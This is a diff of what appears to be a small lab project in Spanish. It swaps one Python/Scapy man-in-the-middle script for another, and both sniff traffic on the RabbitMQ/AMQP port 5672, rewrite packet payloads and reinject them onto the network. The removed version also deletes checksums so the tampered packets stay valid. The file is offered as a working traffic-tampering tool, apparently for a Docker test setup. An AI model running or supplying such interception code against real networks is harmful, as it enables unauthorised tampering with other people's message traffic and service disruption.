@@ -32,19 +32,23 @@ from scapy.all import *
 
 print("🧃 Sniffer MITM activo...")
 
-def packet_callback(packet):
-    if packet.haslayer(TCP) and packet[TCP].dport == 5672:
-        print(f"📦 Original: {packet.summary()}")
-        if Raw in packet:
-            original = packet[Raw].load
-            modified = b"HACKED_" + original
-            packet[Raw].load = modified
-            del packet[IP].chksum
-            del packet[TCP].chksum
-            send(packet)
-            print(f"🚨 Modificado y reinyectado: {packet.summary()}")
+from scapy.all import *
 
-sniff(filter="tcp port 5672", prn=packet_callback, store=0)
+IFACE = "eth0"
+FILTER = "tcp port 5672"
+
+def fuzz(packet):
+    if packet.haslayer(Raw):
+        print(f"👀 ORIGINAL: {packet.summary()}")
+        # Mini fuzz: reemplaza texto, o corrompe bits, tu delirio
+        if b"hello" in packet[Raw].load:
+            packet[Raw].load = packet[Raw].load.replace(b"hello", b"VIRUS!!!")
+        send(packet)
+        print(f"💥 MODIFICADO: {packet.summary()}")
+
+print(f"🔥 Sniffing en {IFACE} filtrando {FILTER}")
+sniff(iface=IFACE, filter=FILTER, prn=fuzz)
+
 
 ## 🧃 Dockerfile el_sniffer
 FROM python:3.11-slim
